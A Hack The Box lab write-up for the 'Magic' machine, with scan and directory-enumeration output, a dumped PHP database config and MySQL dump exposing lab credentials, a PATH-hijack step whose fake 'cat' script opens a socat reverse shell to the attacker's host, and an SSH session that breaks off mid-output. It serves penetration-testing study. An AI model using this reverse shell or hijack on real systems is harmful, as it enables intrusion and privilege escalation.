# [Magic] - [HTB]
**Difficulty:** [Medium]  
**OS:** [Linux]  
**Date:** [09/09/2025]  
**Machine Type:** [OSWE]

---

## 1. Summary
- **Objective:** [ ] Capture user flag  
- **Objective:** [ ] Capture root flag / administrator access  
- **Description / Notes:** [Brief overview of the machine, main services, challenges]  
- **Skills Practiced:** 
  - [ ] Enumeration
  - [ ] Web Exploitation
  - [ ] Binary Exploitation
  - [ ] Privilege Escalation
  - [ ] Reverse Engineering
  - [ ] Pivoting / Networking
  - [ ] Others: _________

---

## 2. Recon & Enumeration

### 2.1 Network Scanning
```bash
┌──(sabeshan㉿kali)-[~]
└─$ nmap -sS -A -sV -T4 10.10.10.185 -vv    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 16:24 IST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:24
Completed NSE at 16:24, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:24
Completed NSE at 16:24, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:24
Completed NSE at 16:24, 0.00s elapsed
Initiating Ping Scan at 16:24
Scanning 10.10.10.185 [4 ports]
Completed Ping Scan at 16:24, 0.24s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:24
Completed Parallel DNS resolution of 1 host. at 16:24, 0.06s elapsed
Initiating SYN Stealth Scan at 16:24
Scanning 10.10.10.185 [1000 ports]
Discovered open port 22/tcp on 10.10.10.185
Discovered open port 80/tcp on 10.10.10.185
Increasing send delay for 10.10.10.185 from 0 to 5 due to 438 out of 1094 dropped probes since last increase.
Completed SYN Stealth Scan at 16:24, 5.05s elapsed (1000 total ports)
Initiating Service scan at 16:24
Scanning 2 services on 10.10.10.185
Completed Service scan at 16:24, 6.47s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.185
Initiating Traceroute at 16:24
Completed Traceroute at 16:24, 0.22s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 16:24
Completed Parallel DNS resolution of 2 hosts. at 16:24, 6.56s elapsed
NSE: Script scanning 10.10.10.185.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:24
Completed NSE at 16:24, 6.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:24
Completed NSE at 16:24, 2.06s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:24
Completed NSE at 16:24, 0.00s elapsed
Nmap scan report for 10.10.10.185
Host is up, received echo-reply ttl 63 (0.21s latency).
Scanned at 2025-09-09 16:24:06 IST for 28s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ=
|   256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/9%OT=22%CT=1%CU=33760%PV=Y%DS=2%DC=T%G=Y%TM=68C0076A
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M577ST11NW7%O2=M577ST11NW7%O3=M577NNT11NW7%O4=M577ST11NW7%O5=M577ST11
OS:NW7%O6=M577ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M577NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 24.674 days (since Sat Aug 16 00:13:53 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   209.60 ms 10.10.14.1
2   209.74 ms 10.10.10.185

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:24
Completed NSE at 16:24, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:24
Completed NSE at 16:24, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:24
Completed NSE at 16:24, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.55 seconds
           Raw packets sent: 1482 (66.042KB) | Rcvd: 1124 (45.690KB)
```
---
```bash
┌──(sabeshan㉿kali)-[~]
└─$ dirsearch -u http://10.10.10.185/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )
                                                                                                                                                             
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/sabeshan/reports/http_10.10.10.185/__25-09-09_16-30-02.txt

Target: http://10.10.10.185/

[16:30:02] Starting:                                                                                                                                         
[16:30:17] 403 -  277B  - /.ht_wsr.txt                                      
[16:30:17] 403 -  277B  - /.htaccess.orig                                   
[16:30:17] 403 -  277B  - /.htaccess.bak1                                   
[16:30:17] 403 -  277B  - /.htaccess.sample
[16:30:17] 403 -  277B  - /.htaccess.save
[16:30:17] 403 -  277B  - /.htaccess_extra                                  
[16:30:17] 403 -  277B  - /.htaccess_sc
[16:30:17] 403 -  277B  - /.htaccess_orig
[16:30:17] 403 -  277B  - /.htaccessBAK
[16:30:17] 403 -  277B  - /.htaccessOLD2
[16:30:17] 403 -  277B  - /.htaccessOLD
[16:30:17] 403 -  277B  - /.htm                                             
[16:30:17] 403 -  277B  - /.html                                            
[16:30:17] 403 -  277B  - /.htpasswd_test                                   
[16:30:17] 403 -  277B  - /.httr-oauth                                      
[16:30:17] 403 -  277B  - /.htpasswds
[16:30:18] 403 -  277B  - /.jenkins.sh                                      
[16:30:20] 403 -  277B  - /.php                                             
[16:30:20] 403 -  277B  - /.php3                                            
[16:30:21] 403 -  277B  - /.sh                                              
[16:30:22] 403 -  277B  - /.sh_history                                      
[16:30:22] 403 -  277B  - /.shell.pre-oh-my-zsh
[16:30:22] 403 -  277B  - /.shrc
[16:30:22] 403 -  277B  - /.shtml                                           
[16:30:22] 403 -  277B  - /.sql                                             
[16:30:22] 403 -  277B  - /.sql.bz2                                         
[16:30:22] 403 -  277B  - /.sql.gz
[16:30:22] 403 -  277B  - /.sqlite
[16:30:22] 403 -  277B  - /.sqlite_history
[16:30:22] 403 -  277B  - /.sqlite3
[16:30:24] 403 -  277B  - /.travis.sh                                       
[16:30:27] 403 -  277B  - /1.sql                                            
[16:30:28] 403 -  277B  - /2.sql                                            
[16:30:29] 403 -  277B  - /2010.sql                                         
[16:30:29] 403 -  277B  - /2011.sql                                         
[16:30:29] 403 -  277B  - /2012.sql                                         
[16:30:29] 403 -  277B  - /2013.sql                                         
[16:30:29] 403 -  277B  - /2014.sql                                         
[16:30:29] 403 -  277B  - /2015.sql                                         
[16:30:29] 403 -  277B  - /2016.sql                                         
[16:30:30] 403 -  277B  - /2018.sql                                         
[16:30:30] 403 -  277B  - /2017.sql                                         
[16:30:30] 403 -  277B  - /2019.sql                                         
[16:30:30] 403 -  277B  - /2020.sql                                         
[16:30:37] 403 -  277B  - /accounts.sql                                     
[16:30:40] 403 -  277B  - /adm.shtml                                        
[16:30:42] 403 -  277B  - /admin.shtml                                      
[16:30:55] 403 -  277B  - /administrator.shtml                              
[16:30:58] 403 -  277B  - /affiliates.sql                                   
[16:31:00] 403 -  277B  - /archive.sql                                      
[16:31:01] 301 -  313B  - /assets  ->  http://10.10.10.185/assets/          
[16:31:01] 403 -  277B  - /assets/                                          
[16:31:02] 403 -  277B  - /back.sql                                         
[16:31:02] 403 -  277B  - /backup.sql                                       
[16:31:02] 403 -  277B  - /backup.sql.old                                   
[16:31:02] 403 -  277B  - /backups.sql                                      
[16:31:02] 403 -  277B  - /backups.sql.old
[16:31:05] 403 -  277B  - /buck.sql                                         
[16:31:05] 403 -  277B  - /build.sh                                         
[16:31:08] 403 -  277B  - /clients.sqlite                                   
[16:31:08] 403 -  277B  - /clients.sql
[16:31:09] 403 -  277B  - /config.sql                                       
[16:31:11] 403 -  277B  - /controlpanel.shtml                               
[16:31:12] 403 -  277B  - /cron.sh                                          
[16:31:13] 403 -  277B  - /customers.sql.gz                                 
[16:31:13] 403 -  277B  - /customers.sqlite                                 
[16:31:13] 403 -  277B  - /customers.sql
[16:31:13] 403 -  277B  - /data.sql                                         
[16:31:13] 403 -  277B  - /data.sqlite                                      
[16:31:13] 403 -  277B  - /database.sql                                     
[16:31:14] 403 -  277B  - /database.sqlite                                  
[16:31:14] 403 -  277B  - /database.yml.sqlite3                             
[16:31:14] 403 -  277B  - /db.sql                                           
[16:31:14] 403 -  277B  - /db.sqlite3
[16:31:14] 403 -  277B  - /db.sqlite
[16:31:15] 403 -  277B  - /db1.sqlite                                       
[16:31:15] 403 -  277B  - /db_backup.sql                                    
[16:31:15] 403 -  277B  - /dbase.sql                                        
[16:31:15] 403 -  277B  - /dbdump.sql                                       
[16:31:16] 403 -  277B  - /df_main.sql                                      
[16:31:18] 403 -  277B  - /dump.sh                                          
[16:31:18] 403 -  277B  - /dump.sql.old                                     
[16:31:18] 403 -  277B  - /dump.sql
[16:31:18] 403 -  277B  - /dump.sqlite
[16:31:18] 403 -  277B  - /dump.sql.tgz                                     
[16:31:23] 403 -  277B  - /file_upload.shtm                                 
[16:31:25] 403 -  277B  - /forum.sql                                        
[16:31:30] 301 -  313B  - /images  ->  http://10.10.10.185/images/          
[16:31:30] 403 -  277B  - /images/                                          
[16:31:31] 403 -  277B  - /index.shtml                                      
[16:31:32] 403 -  277B  - /install.sql                                      
[16:31:36] 403 -  277B  - /localhost.sql                                    
[16:31:36] 403 -  277B  - /log.sqlite                                       
[16:31:36] 200 -    1KB - /login.php                                        
[16:31:37] 403 -  277B  - /login.shtml                                      
[16:31:37] 302 -    0B  - /logout.php  ->  index.php                        
[16:31:37] 403 -  277B  - /logs.sqlite                                      
[16:31:38] 403 -  277B  - /ltmain.sh                                        
[16:31:40] 403 -  277B  - /members.sql                                      
[16:31:40] 403 -  277B  - /members.shtml
[16:31:40] 403 -  277B  - /members.sql.gz
[16:31:40] 403 -  277B  - /members.sqlite                                   
[16:31:43] 403 -  277B  - /mysql.sql                                        
[16:31:44] 403 -  277B  - /mysql_debug.sql                                  
[16:31:44] 403 -  277B  - /mysqldump.sql                                    
[16:31:44] 403 -  277B  - /netadmin.shtml                                   
[16:31:47] 403 -  277B  - /orders.sql.gz                                    
[16:31:47] 403 -  277B  - /orders.sql                                       
[16:31:48] 403 -  277B  - /password.sqlite                                  
[16:31:48] 403 -  277B  - /passwords.sqlite                                 
[16:31:49] 403 -  277B  - /personal.sqlite                                  
[16:31:55] 403 -  277B  - /private.sqlite                                   
[16:31:58] 403 -  277B  - /run.sh                                           
[16:31:59] 403 -  277B  - /sales.sql.gz                                     
[16:31:59] 403 -  277B  - /sales.sql                                        
[16:31:59] 403 -  277B  - /schema.sql                                       
[16:32:01] 403 -  277B  - /server-status                                    
[16:32:01] 403 -  277B  - /server-status/                                   
[16:32:02] 403 -  277B  - /setup.sql                                        
[16:32:02] 403 -  277B  - /shell.sh                                         
[16:32:03] 403 -  277B  - /signin.shtml                                     
[16:32:04] 403 -  277B  - /site.sql                                         
[16:32:05] 403 -  277B  - /sql.sql                                          
[16:32:06] 403 -  277B  - /sqldump.sql                                      
[16:32:06] 403 -  277B  - /start.sh                                         
[16:32:07] 403 -  277B  - /startup.sh                                       
[16:32:12] 403 -  277B  - /temp.sql                                         
[16:32:12] 403 -  277B  - /test.sqlite                                      
[16:32:14] 403 -  277B  - /translate.sql                                    
[16:32:15] 403 -  277B  - /upload.shtm                                      
[16:32:15] 302 -    3KB - /upload.php  ->  login.php
[16:32:17] 403 -  277B  - /users.sql                                        
[16:32:17] 403 -  277B  - /users.sql.gz                                     
[16:32:17] 403 -  277B  - /users.sqlite                                     
[16:32:18] 403 -  277B  - /vb.sql                                           
[16:32:21] 403 -  277B  - /web.sql                                          
[16:32:24] 403 -  277B  - /www.sql                                          
[16:32:24] 403 -  277B  - /wwwroot.sql                                      
                                                                             
Task Completed
```
---

<img width="1581" height="752" alt="image" src="https://github.com/user-attachments/assets/d1b4340e-d930-4b42-abfe-b728e8cc820b" />

---
```bash
┌──(sabeshan㉿kali)-[~/HTB/OSCP/Magic]
└─$ gobuster dir -u http://10.10.10.185/images/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.185/images/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 321] [--> http://10.10.10.185/images/uploads/]
Progress: 273 / 81644 (0.33%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 298 / 81644 (0.36%)
===============================================================
Finished
===============================================================
```
---

<img width="1482" height="459" alt="image" src="https://github.com/user-attachments/assets/b25ed143-c249-4069-9d8f-0c82178278b7" />

---

<img width="784" height="378" alt="image" src="https://github.com/user-attachments/assets/1fb9b53e-4c92-415b-a610-8cc97057fd75" />

----
```bash
www-data@magic:/var/www/Magic$ cat db.php5 
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
www-data@magic:/var/www/Magic$ 
```
---
```bash
www-data@magic:/home/theseus$ mysql -u theseus -p

Command 'mysql' not found, but can be installed with:

apt install mysql-client-core-5.7   
apt install mariadb-client-core-10.1

Ask your administrator to install one of them.

www-data@magic:/home/theseus$ mysql
mysql_config_editor        mysql_ssl_rsa_setup        mysqlbinlog                mysqldump                  mysqlrepair
mysql_embedded             mysql_tzinfo_to_sql        mysqlcheck                 mysqldumpslow              mysqlreport
mysql_install_db           mysql_upgrade              mysqld                     mysqlimport                mysqlshow
mysql_plugin               mysqladmin                 mysqld_multi               mysqloptimize              mysqlslap
mysql_secure_installation  mysqlanalyze               mysqld_safe                mysqlpump                  
www-data@magic:/home/theseus$ mysql
mysql_config_editor        mysql_ssl_rsa_setup        mysqlbinlog                mysqldump                  mysqlrepair
mysql_embedded             mysql_tzinfo_to_sql        mysqlcheck                 mysqldumpslow              mysqlreport
mysql_install_db           mysql_upgrade              mysqld                     mysqlimport                mysqlshow
mysql_plugin               mysqladmin                 mysqld_multi               mysqloptimize              mysqlslap
mysql_secure_installation  mysqlanalyze               mysqld_safe                mysqlpump                  
www-data@magic:/home/theseus$ mysql
```
----
```bash
www-data@magic:/home/theseus$ mysqldump -u theseus -p Magic   
Enter password: 
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version       5.7.29-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2025-09-09  8:27:05
```
---
```bash
echo "./socat tcp-connect:10.10.14.18:5555
exec:/bin/sh,pty,stderr,setsid,sigint,sane" > cat
chmod +x cat
```
---
```bash
┌──(sabeshan㉿kali)-[~/HTB/OSCP/Magic]
└─$ ssh -i theseus theseus@10.10.10.185
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

407 packages can be updated.
305 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Tue Sep  9 08:34:36 2025 from 10.10.14.18
theseus@magic:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
theseus@magic:~$ mkdir tmp
theseus@magic:~$ sysinfo
====================Hardware Info====================
H/W path           Device     Class      Description
====================================================
                              system     VMware Virtual Platform
/0                            bus        440BX Desktop Reference Platform
/0/0                          memory     86KiB BIOS
/0/1                          processor  AMD EPYC 7513 32-Core Processor
/0/1/0                        memory     16KiB L1 cache
/0/1/1                        memory     16KiB L1 cache
/0/1/2                        memory     512KiB L2 cache
/0/1/3                        memory     512KiB L2 cache
/0/2                          processor  AMD EPYC 7513 32-Core Processor
/0/28                         memory     System Memory
/0/28/0                       memory     4GiB DIMM DRAM EDO
/0/28/1                       memory     DIMM DRAM [empty]
/0/28/2                       memory     DIMM DRAM [empty]
/0/28/3                       memory     DIMM DRAM [empty]
/0/28/4                       memory     DIMM DRAM [empty]
/0/28/5                       memory     DIMM DRAM [empty]
/0/28/6                       memory     DIMM DRAM [empty]
/0/28/7                       memory     DIMM DRAM [empty]
/0/28/8                       memory     DIMM DRAM [empty]
/0/28/9                       memory     DIMM DRAM [empty]
/0/28/a                       memory     DIMM DRAM [empty]
/0/28/b                       memory     DIMM DRAM [empty]
/0/28/c                       memory     DIMM DRAM [empty]
/0/28/d                       memory     DIMM DRAM [empty]
/0/28/e                       memory     DIMM DRAM [empty]
/0/28/f                       memory     DIMM DRAM [empty]
/0/28/10                      memory     DIMM DRAM [empty]
/0/28/11                      memory     DIMM DRAM [empty]
/0/28/12                      memory     DIMM DRAM [empty]
/0/28/13                      memory     DIMM DRAM [empty]
/0/28/14                      memory     DIMM DRAM [empty]
/0/28/15                      memory     DIMM DRAM [empty]
/0/28/16                      memory     DIMM DRAM [empty]
/0/28/17                      memory     DIMM DRAM [empty]
/0/28/18                      memory     DIMM DRAM [empty]
/0/28/19                      memory     DIMM DRAM [empty]
/0/28/1a                      memory     DIMM DRAM [empty]
/0/28/1b                      memory     DIMM DRAM [empty]
/0/28/1c                      memory     DIMM DRAM [empty]
/0/28/1d                      memory     DIMM DRAM [empty]
/0/28/1e                      memory     DIMM DRAM [empty]
/0/28/1f                      memory     DIMM DRAM [empty]
/0/28/20                      memory     DIMM DRAM [empty]
/0/28/21                      memory     DIMM DRAM [empty]
/0/28/22                      memory     DIMM DRAM [empty]
/0/28/23                      memory     DIMM DRAM [empty]
/0/28/24                      memory     DIMM DRAM [empty]
/0/28/25                      memory     DIMM DRAM [empty]
/0/28/26                      memory     DIMM DRAM [empty]
/0/28/27                      memory     DIMM DRAM [empty]
/0/28/28                      memory     DIMM DRAM [empty]
/0/28/29                      memory     DIMM DRAM [empty]
/0/28/2a                      memory     DIMM DRAM [empty]
/0/28/2b                      memory     DIMM DRAM [empty]
/0/28/2c                      memory     DIMM DRAM [empty]
/0/28/2d                      memory     DIMM DRAM [empty]
/0/28/2e                      memory     DIMM DRAM [empty]
/0/28/2f                      memory     DIMM DRAM [empty]
/0/28/30                      memory     DIMM DRAM [empty]
/0/28/31                      memory     DIMM DRAM [empty]
/0/28/32                      memory     DIMM DRAM [empty]
/0/28/33                      memory     DIMM DRAM [empty]
/0/28/34                      memory     DIMM DRAM [empty]
/0/28/35                      memory     DIMM DRAM [empty]
/0/28/36                      memory     DIMM DRAM [empty]
/0/28/37                      memory     DIMM DRAM [empty]
/0/28/38                      memory     DIMM DRAM [empty]
/0/28/39                      memory     DIMM DRAM [empty]
/0/28/3a                      memory     DIMM DRAM [empty]
/0/28/3b                      memory     DIMM DRAM [empty]
/0/28/3c                      memory     DIMM DRAM [empty]
/0/28/3d                      memory     DIMM DRAM [empty]
/0/28/3e                      memory     DIMM DRAM [empty]
/0/28/3f                      memory     DIMM DRAM [empty]
/0/3                          memory     
/0/3/0                        memory     DIMM [empty]
/0/4                          memory     
/0/4/0                        memory     DIMM [empty]
/0/5                          memory     
/0/5/0                        memory     DIMM [empty]
/0/6                          memory     
/0/6/0                        memory     DIMM [empty]
/0/7                          memory     
/0/7/0                        memory     DIMM [empty]
/0/8                          memory     
/0/8/0                        memory     DIMM [empty]
/0/9                          memory     
/0/9/0                        memory     DIMM [empty]
/0/a                          memory     
/0/a/0                        memory     DIMM [empty]
/0/b                          memory     
/0/b/0                        memory     DIMM [empty]
/0/c                          memory     
/0/c/0                        memory     DIMM [empty]
/0/d                          memory     
/0/d/0                        memory     DIMM [empty]
/0/e                          memory     
/0/e/0                        memory     DIMM [empty]
/0/f                          memory     
/0/f/0                        memory     DIMM [empty]
/0/10                         memory     
/0/10/0                       memory     DIMM [empty]
/0/11                         memory     
/0/11/0                       memory     DIMM [empty]
/0/12                         memory     
/0/12/0                       memory     DIMM [empty]
/0/13                         memory     
/0/13/0                       memory     DIMM [empty]
/0/14                         memory     
/0/14/0                       memory     DIMM [empty]
/0/15                         memory     
/0/15/0                       memory     DIMM [empty]
/0/16                         memory     
/0/16/0                       memory     DIMM [empty]
/0/17                         memory     
/0/17/0                       memory     DIMM [empty]
/0/18                         memory     
/0/18/0                       memory     DIMM [empty]
/0/19                         memory     
/0/19/0                       memory     DIMM [empty]
/0/1a                         memory     
/0/1a/0                       memory     DIMM [empty]
/0/1b                         memory     
/0/1b/0                       memory     DIMM [empty]
/0/1c                         memory     
/0/1c/0                       memory     DIMM [empty]
/0/1d                         memory     
/0/1d/0                       memory     DIMM [empty]
/0/1e                         memory     
/0/1e/0                       memory     DIMM [empty]
/0/1f                         memory     
/0/1f/0                       memory     DIMM [empty]
/0/20                         memory     
/0/20/0                       memory     DIMM [empty]
/0/21                         memory     
/0/21/0                       memory     DIMM [empty]
/0/22                         memory     
/0/22/0                       memory     DIMM [empty]
/0/23                         memory     
/0/23/0                       memory     DIMM [empty]
/0/24                         memory     
/0/24/0                       memory     DIMM [empty]
/0/25                         memory     
/0/25/0                       memory     DIMM [empty]
/0/26                         memory     
/0/26/0                       memory     DIMM [empty]
/0/27                         memory     
/0/27/0                       memory     DIMM [empty]
/0/29                         memory     
/0/29/0                       memory     DIMM [empty]
/0/2a                         memory     
/0/2a/0                       memory     DIMM [empty]
/0/2b                         memory     
/0/2b/0                       memory     DIMM [empty]
/0/2c                         memory     
/0/2c/0                       memory     DIMM [empty]
/0/2d                         memory     
/0/2d/0                       memory     DIMM [empty]
/0/2e                         memory     
/0/2e/0                       memory     DIMM [empty]
/0/2f                         memory     
/0/2f/0                       memory     DIMM [empty]
/0/30                         memory     
/0/30/0                       memory     DIMM [empty]
/0/31                         memory     
/0/31/0                       memory     DIMM [empty]
/0/32                         memory     
/0/32/0                       memory     DIMM [empty]
/0/33                         memory     
/0/33/0                       memory     DIMM [empty]
/0/34                         memory     
/0/34/0                       memory     DIMM [empty]
/0/35                         memory     
/0/35/0                       memory     DIMM [empty]
/0/36                         memory     
/0/36/0                       memory     DIMM [empty]
/0/37                         memory     
/0/37/0                       memory     DIMM [empty]
/0/38                         memory     
/0/38/0                       memory     DIMM [empty]
/0/39                         memory     
/0/39/0                       memory     DIMM [empty]
/0/3a                         memory     
/0/3a/0                       memory     DIMM [empty]
/0/3b                         memory     
/0/3b/0                       memory     DIMM [empty]
/0/3c                         memory     
/0/3c/0                       memory     DIMM [empty]
/0/3d                         memory     
/0/3d/0                       memory     DIMM [empty]
/0/3e                         memory     
/0/3e/0                       memory     DIMM [empty]
/0/3f                         memory     
/0/3f/0                       memory     DIMM [empty]
/0/40                         memory     
/0/40/0                       memory     DIMM [empty]
/0/41                         memory     
/0/41/0                       memory     DIMM [empty]
/0/42                         memory     
/0/42/0                       memory     DIMM [empty]
/0/43                         memory     
/0/43/0                       memory     DIMM [empty]
/0/44                         memory     
/0/45                         memory     
/0/100                        bridge     440BX/ZX/DX - 82443BX/ZX/DX Host bridge
/0/100/1                      bridge     440BX/ZX/DX - 82443BX/ZX/DX AGP bridge
/0/100/7                      bridge     82371AB/EB/MB PIIX4 ISA
/0/100/7.1                    storage    82371AB/EB/MB PIIX4 IDE
